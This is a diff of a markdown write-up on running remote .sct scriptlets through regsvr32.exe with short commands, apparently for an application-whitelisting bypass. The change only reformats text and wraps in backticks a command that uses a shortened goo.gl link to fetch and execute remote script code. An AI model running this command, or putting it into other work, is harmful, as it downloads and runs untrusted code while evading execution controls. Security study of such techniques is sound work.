@@ -121,8 +121,12 @@ But we can use regsvr32.exe to run .sct file with very few letters.
 
 
 What's more, the third-party link shortener Twitter can save more space.
+
+
 Google url shortener,like this:
-regsvr32 /s /n /u /i:https://goo.gl/ijB12k scrobj.dll
+
+
+`regsvr32 /s /n /u /i:https://goo.gl/ijB12k scrobj.dll`
 
 
 
